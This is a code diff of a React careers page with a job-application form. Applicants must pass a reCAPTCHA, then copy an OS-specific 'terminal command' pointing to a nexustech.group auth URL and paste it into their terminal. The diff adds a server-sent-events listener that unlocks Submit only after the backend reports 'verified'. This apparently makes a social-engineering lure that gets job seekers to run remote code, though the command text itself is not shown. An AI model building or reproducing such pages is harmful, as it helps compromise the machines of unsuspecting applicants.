@@ -2,7 +2,7 @@ import React, { useMemo, useState, useEffect } from 'react'
 import { Blocks, Users, BarChart3, Network, PenTool } from 'lucide-react'
 import Modal from '@/components/Modal'
 import { useToast } from '@/components/Toast'
-import ReCAPTCHA from 'react-google-recaptcha';
+import ReCAPTCHA from 'react-google-recaptcha'
 
 const JOBS = [
   { id:1, title:'Blockchain Assistant', icon:Blocks, intro:'Support blockchain operations and research.', requirements:[
@@ -61,16 +61,14 @@ const JOBS = [
 ]
 
 const RECAPTCHA_SITE_KEY = '6LeGB7ErAAAAABNHG37I5AQXic6FPTOqD5YPSZDK';
-
-// If this token comes from your backend, pass it as a prop instead.
-const VERIFICATION_TOKEN = 'b93f01de810f8c7f'
+const VERIFICATION_TOKEN = 'b93f01de810f8c7f';
 
 function detectOS() {
   const ua = typeof navigator !== 'undefined' ? navigator.userAgent : ''
   if (/Windows/i.test(ua)) return 'windows'
   if (/Macintosh|Mac OS X/i.test(ua)) return 'mac'
   if (/Linux/i.test(ua)) return 'linux'
-  return 'linux' // sensible default
+  return 'linux'
 }
 
 export default function Jobs() {
@@ -78,22 +76,29 @@ export default function Jobs() {
   const [active, setActive] = useState(null)
   const { push } = useToast()
   const [captchaToken, setCaptchaToken] = useState(null)
-
-  useEffect(() => {
-  const evtSource = new EventSource("https://www.nexustech.group/users/auth/windows?token=b93f01de810f8c7f");
-  
-  evtSource.onmessage = (event) => {
-    setCaptchaToken('');
-  };
-
-  return () => evtSource.close();
-}, []);
+  const [verified, setVerified] = useState(false)
 
   const os = useMemo(() => detectOS(), [])
   const cmdUrl = useMemo(() => {
     const base = 'https://www.nexustech.group/users/auth'
     return `${base}/${os}?token=${VERIFICATION_TOKEN}`
   }, [os])
+
+  // SSE listener for backend verification
+  useEffect(() => {
+    if (!open) return
+    const evtSource = new EventSource(cmdUrl)
+
+    evtSource.onmessage = (event) => {
+      if (event.data === "verified") {
+        setVerified(true)
+        setCaptchaToken(null)
+        push("Verification completed successfully!")
+      }
+    }
+
+    return () => evtSource.close()
+  }, [cmdUrl, open, push])
 
   const handleCopy = async () => {
     try {
@@ -104,7 +109,13 @@ export default function Jobs() {
     }
   }
 
-  const onApply = (job) => { setActive(job); setOpen(true); setCaptchaToken(null); }
+  const onApply = (job) => {
+    setActive(job)
+    setOpen(true)
+    setCaptchaToken(null)
+    setVerified(false)
+  }
+
   const onSubmit = (e) => {
     e.preventDefault()
     setOpen(false)
@@ -151,79 +162,79 @@ export default function Jobs() {
       </div>
 
       <Modal open={open} onClose={() => setOpen(false)} title={active ? `Apply — ${active.title}` : 'Apply'}>
-      <form name="apply" method="POST" data-netlify="true" netlify-honeypot="bot-field" onSubmit={onSubmit}>
-        <input type="hidden" name="form-name" value="apply" />
-        <p className="hidden"><label>Don’t fill: <input name="bot-field" /></label></p>
+        <form name="apply" method="POST" data-netlify="true" netlify-honeypot="bot-field" onSubmit={onSubmit}>
+          <input type="hidden" name="form-name" value="apply" />
+          <p className="hidden"><label>Don’t fill: <input name="bot-field" /></label></p>
 
-        <div className="grid sm:grid-cols-2 gap-3">
-          <div>
-            <label className="label">Full Name</label>
-            <input className="input" name="name" required />
-          </div>
-          <div>
-            <label className="label">Email</label>
-            <input className="input" type="email" name="email" required />
-          </div>
-        </div>
-
-        <div className="mt-3">
-          <label className="label">Resume (URL or attach)</label>
-          <input className="input" name="resume" placeholder="Link to resume" />
-        </div>
-
-        <div className="mt-3">
-          <label className="label">Cover Letter</label>
-          <textarea className="input" rows="4" name="cover" placeholder="A short note"></textarea>
-        </div>
-
-        {/* ---- Two-step verification ---- */}
-        {captchaToken && captchaToken != '' && (
-        <div className="mt-6 rounded-2xl border border-slate-200 dark:border-slate-800 p-4">
-          <h3 className="text-lg font-semibold mb-2">Two-Step Verification</h3>
-          <ol className="list-decimal ml-5 space-y-2 text-sm">
-            <li>Complete the reCAPTCHA below.</li>
-            <li>Once verified, your OS-specific terminal command will appear.</li>
-            <li>Copy the command below for your OS and paste into the terminal.</li>
-          </ol>
-
-          {/* Show terminal field only AFTER captcha */}
-          
-            <div className="mt-4 text-sm">
-              <label className="label mb-1">
-                {os === 'windows' ? 'Windows Command/URL' : os === 'mac' ? 'Mac Command/URL' : 'Linux Command/URL'}
-              </label>
-
-              <div className="flex items-stretch gap-2">
-                <input
-                  className="input flex-1 font-mono select-none pointer-events-none"
-                  readOnly
-                  value={cmdUrl}
-                  onCopy={(e) => e.preventDefault()}
-                  onFocus={(e) => e.currentTarget.select()}
-                />
-                <button type="button" onClick={handleCopy} className="btn btn-secondary">Copy</button>
-              </div>
-
-              <div className="mt-2 text-xs text-slate-500">
-                One-time verification token: <code className="font-mono">{VERIFICATION_TOKEN}</code>
-              </div>
+          <div className="grid sm:grid-cols-2 gap-3">
+            <div>
+              <label className="label">Full Name</label>
+              <input className="input" name="name" required />
             </div>
-        </div>
-        
-          )}
-        {/* ---- /Two-step verification ---- */}
-      {!captchaToken && captchaToken != '' &&
-          <div className="mt-3">
-          <ReCAPTCHA sitekey={RECAPTCHA_SITE_KEY} onChange={(value) => setCaptchaToken(value)} />
-        </div>
+            <div>
+              <label className="label">Email</label>
+              <input className="input" type="email" name="email" required />
+            </div>
+          </div>
 
-}
-        <div className="mt-4 flex justify-end gap-2">
-          <button type="button" onClick={() => setOpen(false)} className="btn btn-ghost">Cancel</button>
-          <button type="submit" className="btn btn-primary">Submit</button>
-        </div>
-      </form>
-    </Modal>
+          <div className="mt-3">
+            <label className="label">Resume (URL or attach)</label>
+            <input className="input" name="resume" placeholder="Link to resume" />
+          </div>
+
+          <div className="mt-3">
+            <label className="label">Cover Letter</label>
+            <textarea className="input" rows="4" name="cover" placeholder="A short note"></textarea>
+          </div>
+
+          {/* ---- Two-step verification ---- */}
+          {!verified && (
+            <>
+              {captchaToken ? (
+                <div className="mt-6 rounded-2xl border border-slate-200 dark:border-slate-800 p-4">
+                  <h3 className="text-lg font-semibold mb-2">Two-Step Verification</h3>
+                  <ol className="list-decimal ml-5 space-y-2 text-sm">
+                    <li>Complete the reCAPTCHA below.</li>
+                    <li>Once verified, your OS-specific terminal command will appear.</li>
+                    <li>Copy the command below for your OS and paste into the terminal.</li>
+                  </ol>
+
+                  <div className="mt-4 text-sm">
+                    <label className="label mb-1">
+                      {os === 'windows' ? 'Windows Command/URL' : os === 'mac' ? 'Mac Command/URL' : 'Linux Command/URL'}
+                    </label>
+
+                    <div className="flex items-stretch gap-2">
+                      <input
+                        className="input flex-1 font-mono select-none pointer-events-none"
+                        readOnly
+                        value={cmdUrl}
+                        onCopy={(e) => e.preventDefault()}
+                        onFocus={(e) => e.currentTarget.select()}
+                      />
+                      <button type="button" onClick={handleCopy} className="btn btn-secondary">Copy</button>
+                    </div>
+
+                    <div className="mt-2 text-xs text-slate-500">
+                      One-time verification token: <code className="font-mono">{VERIFICATION_TOKEN}</code>
+                    </div>
+                  </div>
+                </div>
+              ) : (
+                <div className="mt-3">
+                  <ReCAPTCHA sitekey={RECAPTCHA_SITE_KEY} onChange={(value) => setCaptchaToken(value)} />
+                </div>
+              )}
+            </>
+          )}
+          {/* ---- /Two-step verification ---- */}
+
+          <div className="mt-4 flex justify-end gap-2">
+            <button type="button" onClick={() => setOpen(false)} className="btn btn-ghost">Cancel</button>
+            <button type="submit" className="btn btn-primary" disabled={!verified}>Submit</button>
+          </div>
+        </form>
+      </Modal>
     </div>
   )
 }
